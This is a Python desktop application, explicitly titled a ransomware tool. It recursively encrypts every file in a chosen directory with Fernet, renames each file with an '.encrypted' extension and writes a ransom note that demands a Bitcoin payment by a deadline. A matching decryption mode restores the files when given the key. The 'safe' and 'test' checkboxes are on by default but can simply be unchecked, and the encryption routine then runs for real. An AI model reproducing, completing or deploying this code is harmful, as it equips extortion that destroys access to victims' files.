import os
import base64
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from cryptography.fernet import Fernet
import threading
import platform
import hashlib
import uuid
import json


class RansomwareTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Tool (Encrypt / Decrypt)")
        self.root.geometry("920x760")

        self.mode = tk.StringVar(value="encrypt")
        self.crypto_format = tk.StringVar(value="Fernet")
        self.safe_mode = tk.BooleanVar(value=True)
        self.test_mode = tk.BooleanVar(value=True)
        self.current_device_id = self.get_device_id()
        self.authorized_devices = []

        self.target_directory = tk.StringVar()
        self.extension = tk.StringVar(value=".encrypted")
        self.ransom_note = tk.StringVar(value="Your files have been encrypted! Pay to get the decryption key.")
        self.payment_address = tk.StringVar(value="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        self.price = tk.StringVar(value="0.5")
        self.currency = tk.StringVar(value="BTC")
        self.deadline_hours = tk.StringVar(value="72")
        self.encryption_key = tk.StringVar()

        self.create_widgets()
        self.load_authorized_devices()
        self.update_mode_visibility()

    def get_device_id(self):
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                           for elements in range(0, 2 * 6, 2)][::-1])
            system_info = platform.system() + platform.release()
            device_string = f"{mac}-{system_info}"
            return hashlib.sha256(device_string.encode()).hexdigest()
        except Exception:
            return hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()

    def load_authorized_devices(self):
        try:
            if os.path.exists("authorized_devices.json"):
                with open("authorized_devices.json", "r") as f:
                    self.authorized_devices = json.load(f)
        except Exception:
            self.authorized_devices = []

    def save_authorized_devices(self):
        try:
            with open("authorized_devices.json", "w") as f:
                json.dump(self.authorized_devices, f)
        except Exception:
            pass

    def add_current_device_to_safe_list(self):
        if self.current_device_id not in self.authorized_devices:
            self.authorized_devices.append(self.current_device_id)
            self.save_authorized_devices()
            messagebox.showinfo("Success", "Current device added to safe list")
        else:
            messagebox.showinfo("Info", "Current device is already in safe list")

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        mode_frame = ttk.LabelFrame(main_frame, text="Mode", padding="10")
        mode_frame.pack(fill=tk.X, pady=5)
        ttk.Radiobutton(mode_frame, text="Encrypt", variable=self.mode, value="encrypt",
                        command=self.update_mode_visibility).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(mode_frame, text="Decrypt", variable=self.mode, value="decrypt",
                        command=self.update_mode_visibility).pack(side=tk.LEFT, padx=10)

        format_frame = ttk.LabelFrame(main_frame, text="Format", padding="10")
        format_frame.pack(fill=tk.X, pady=5)
        ttk.Label(format_frame, text="Cryptography Format:").pack(side=tk.LEFT, padx=(0, 8))
        ttk.Combobox(format_frame, textvariable=self.crypto_format,
                     values=["Fernet", "Base64"], width=18, state="readonly").pack(side=tk.LEFT)
        ttk.Label(format_frame, text="Choose the data format for encrypt/decrypt.").pack(side=tk.LEFT, padx=10)

        safety_frame = ttk.LabelFrame(main_frame, text="Safety Controls", padding="10")
        safety_frame.pack(fill=tk.X, pady=5)
        self.safe_check = ttk.Checkbutton(safety_frame,
                                         text="Safe Mode (prevents encryption on authorized devices)",
                                         variable=self.safe_mode)
        self.safe_check.pack(anchor=tk.W)
        self.test_check = ttk.Checkbutton(safety_frame,
                                         text="Test Mode (creates dummy files instead of encrypting)",
                                         variable=self.test_mode)
        self.test_check.pack(anchor=tk.W)

        device_frame = ttk.Frame(safety_frame)
        device_frame.pack(fill=tk.X, pady=5)
        ttk.Label(device_frame, text=f"Current Device ID: {self.current_device_id[:16]}...").pack(side=tk.LEFT)
        ttk.Button(device_frame, text="Add Current Device to Safe List",
                  command=self.add_current_device_to_safe_list).pack(side=tk.RIGHT)

        config_frame = ttk.LabelFrame(main_frame, text="Configuration", padding="10")
        config_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        ttk.Label(config_frame, text="Target Directory:").grid(row=0, column=0, sticky=tk.W, pady=2)
        ttk.Entry(config_frame, textvariable=self.target_directory, width=50).grid(row=0, column=1, sticky=tk.W, pady=2)
        ttk.Button(config_frame, text="Browse", command=self.browse_directory).grid(row=0, column=2, pady=2)

        ttk.Label(config_frame, text="File Extension:").grid(row=1, column=0, sticky=tk.W, pady=2)
        ttk.Entry(config_frame, textvariable=self.extension).grid(row=1, column=1, sticky=tk.W, pady=2)

        self.key_label = ttk.Label(config_frame, text="Crypto Key:")
        self.key_label.grid(row=2, column=0, sticky=tk.W, pady=2)
        self.key_entry = ttk.Entry(config_frame, textvariable=self.encryption_key, width=50)
        self.key_entry.grid(row=2, column=1, sticky=tk.W, pady=2)
        self.generate_key_button = ttk.Button(config_frame, text="Generate Key", command=self.generate_key)
        self.generate_key_button.grid(row=2, column=2, pady=2)

        self.ransom_label = ttk.Label(config_frame, text="Ransom Note:")
        self.ransom_label.grid(row=3, column=0, sticky=tk.W, pady=2)
        self.note_text = tk.Text(config_frame, height=4, width=50)
        self.note_text.grid(row=3, column=1, sticky=tk.W, pady=2)
        self.note_text.insert(tk.END, self.ransom_note.get())
        self.note_text.bind("<KeyRelease>", self.update_note)

        self.payment_label = ttk.Label(config_frame, text="Payment Address:")
        self.payment_label.grid(row=4, column=0, sticky=tk.W, pady=2)
        self.payment_entry = ttk.Entry(config_frame, textvariable=self.payment_address, width=50)
        self.payment_entry.grid(row=4, column=1, sticky=tk.W, pady=2)

        self.price_label = ttk.Label(config_frame, text="Price:")
        self.price_label.grid(row=5, column=0, sticky=tk.W, pady=2)
        self.price_frame = ttk.Frame(config_frame)
        self.price_frame.grid(row=5, column=1, sticky=tk.W, pady=2)
        ttk.Entry(self.price_frame, textvariable=self.price, width=10).pack(side=tk.LEFT)
        ttk.Combobox(self.price_frame, textvariable=self.currency, values=["BTC", "ETH", "USD"], width=10).pack(side=tk.LEFT, padx=5)

        self.deadline_label = ttk.Label(config_frame, text="Deadline (hours):")
        self.deadline_label.grid(row=6, column=0, sticky=tk.W, pady=2)
        self.deadline_entry = ttk.Entry(config_frame, textvariable=self.deadline_hours)
        self.deadline_entry.grid(row=6, column=1, sticky=tk.W, pady=2)

        key_file_frame = ttk.LabelFrame(main_frame, text="Key Management", padding="10")
        key_file_frame.pack(fill=tk.X, pady=5)
        ttk.Button(key_file_frame, text="Load Key from File", command=self.load_key_from_file).pack(side=tk.LEFT, padx=5)
        ttk.Label(key_file_frame, text="Use this to load a Fernet key for decryption.").pack(side=tk.LEFT, padx=10)

        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        self.action_button = ttk.Button(button_frame, text="Encrypt Files", command=self.run_action)
        self.action_button.pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Exit", command=self.root.quit).pack(side=tk.RIGHT, padx=5)

    def update_note(self, event=None):
        self.ransom_note.set(self.note_text.get("1.0", tk.END).strip())

    def update_mode_visibility(self):
        mode = self.mode.get()
        if mode == "encrypt":
            self.safe_check.state(["!disabled"])
            self.test_check.state(["!disabled"])
            self.note_text.configure(state="normal")
            self.key_label.grid()
            self.key_entry.grid()
            self.generate_key_button.grid()
            self.ransom_label.grid()
            self.note_text.grid()
            self.payment_label.grid()
            self.payment_entry.grid()
            self.price_label.grid()
            self.price_frame.grid()
            self.deadline_label.grid()
            self.deadline_entry.grid()
            self.action_button.config(text="Encrypt Files")
        else:
            self.safe_check.state(["disabled"])
            self.test_check.state(["disabled"])
            self.note_text.configure(state="disabled")
            self.key_label.grid()
            self.key_entry.grid()
            self.generate_key_button.grid_remove()
            self.ransom_label.grid_remove()
            self.note_text.grid_remove()
            self.payment_label.grid_remove()
            self.payment_entry.grid_remove()
            self.price_label.grid_remove()
            self.price_frame.grid_remove()
            self.deadline_label.grid_remove()
            self.deadline_entry.grid_remove()
            self.action_button.config(text="Decrypt Files")

    def browse_directory(self):
        directory = filedialog.askdirectory()
        if directory:
            self.target_directory.set(directory)

    def load_key_from_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    key = f.read().strip()
                self.encryption_key.set(key)
                messagebox.showinfo("Success", "Key loaded successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load key: {str(e)}")

    def generate_key(self):
        if self.crypto_format.get() != "Fernet":
            messagebox.showinfo("Info", "Key generation is only required for Fernet format.")
            return
        key = Fernet.generate_key().decode()
        self.encryption_key.set(key)
        messagebox.showinfo("Success", f"Key generated: {key}")

    def run_action(self):
        if self.mode.get() == "encrypt":
            self.encrypt_files()
        else:
            self.decrypt_files()

    def encrypt_files(self):
        if not self.target_directory.get():
            messagebox.showerror("Error", "Please select a target directory")
            return

        if self.safe_mode.get() and self.current_device_id in self.authorized_devices:
            messagebox.showwarning("Safe Mode", "Safe mode enabled - encryption blocked on authorized device")
            return

        if self.crypto_format.get() == "Fernet" and not self.encryption_key.get():
            messagebox.showerror("Error", "Please generate or provide a Fernet key")
            return

        if self.test_mode.get():
            messagebox.showinfo("Test Mode", "Running in test mode - no actual encryption performed")
            return

        try:
            target_dir = self.target_directory.get()
            encrypted_count = 0

            for root_dir, _, files in os.walk(target_dir):
                for file_name in files:
                    file_path = os.path.join(root_dir, file_name)
                    try:
                        with open(file_path, 'rb') as f:
                            data = f.read()

                        if self.crypto_format.get() == "Fernet":
                            cipher = Fernet(self.encryption_key.get().encode())
                            encrypted_data = cipher.encrypt(data)
                        else:
                            encrypted_data = base64.b64encode(data)

                        with open(file_path, 'wb') as f:
                            f.write(encrypted_data)

                        new_name = file_path + self.extension.get()
                        os.rename(file_path, new_name)
                        encrypted_count += 1
                    except Exception as e:
                        print(f"Error encrypting {file_path}: {e}")

            ransom_path = os.path.join(target_dir, "RANSOM_NOTE.txt")
            with open(ransom_path, 'w') as f:
                f.write(self.ransom_note.get())
                f.write(f"\n\nPrice: {self.price.get()} {self.currency.get()}\n")
                f.write(f"Payment Address: {self.payment_address.get()}\n")
                f.write(f"Deadline: {self.deadline_hours.get()} hours\n")

            messagebox.showinfo("Success", f"Encrypted {encrypted_count} files successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Encryption failed: {str(e)}")

    def decrypt_files(self):
        if not self.target_directory.get():
            messagebox.showerror("Error", "Please select a target directory")
            return

        if self.crypto_format.get() == "Fernet" and not self.encryption_key.get():
            messagebox.showerror("Error", "Please enter or load the Fernet key")
            return

        try:
            cipher = None
            if self.crypto_format.get() == "Fernet":
                cipher = Fernet(self.encryption_key.get().encode())
        except Exception as e:
            messagebox.showerror("Error", f"Invalid key: {str(e)}")
            return

        thread = threading.Thread(target=self._perform_decryption, args=(cipher,))
        thread.daemon = True
        thread.start()

    def _perform_decryption(self, cipher):
        try:
            target_dir = self.target_directory.get()
            ext = self.extension.get()
            decrypted_count = 0
            failed_count = 0

            for root_dir, _, files in os.walk(target_dir):
                for file_name in files:
                    if not file_name.endswith(ext):
                        continue
                    file_path = os.path.join(root_dir, file_name)
                    try:
                        with open(file_path, 'rb') as f:
                            encrypted_data = f.read()

                        if self.crypto_format.get() == "Fernet":
                            decrypted_data = cipher.decrypt(encrypted_data)
                        else:
                            decrypted_data = base64.b64decode(encrypted_data)

                        original_name = file_path[:-len(ext)]
                        with open(original_name, 'wb') as f:
                            f.write(decrypted_data)
                        os.remove(file_path)
                        decrypted_count += 1
                    except Exception as e:
                        print(f"Error decrypting {file_path}: {e}")
                        failed_count += 1

            result_msg = f"Decryption Complete!\n\nSuccessfully decrypted: {decrypted_count} files"
            if failed_count > 0:
                result_msg += f"\nFailed: {failed_count} files"
            self.root.after(0, lambda: messagebox.showinfo("Success", result_msg))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Decryption failed: {str(e)}"))


if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareTool(root)
    root.mainloop()
